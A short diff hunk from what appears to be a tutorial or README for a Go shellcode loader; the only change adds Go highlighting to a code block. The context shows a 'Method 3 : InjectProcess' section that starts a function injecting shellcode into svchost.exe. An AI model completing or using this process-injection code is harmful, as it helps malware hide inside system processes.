@@ -72,7 +72,7 @@ for this technique we set `VirtualAlloc` for the shellcode in **`addr` variable*
 
 ### Method 3 : InjectProcess
 
-```
+```go
 func injectProcess(sc []byte) {
         pid := FindProcess("svchost.exe")
         fmt.Printf("[*] Injecting into svchost.exe, PID=[%v]\n", pid)
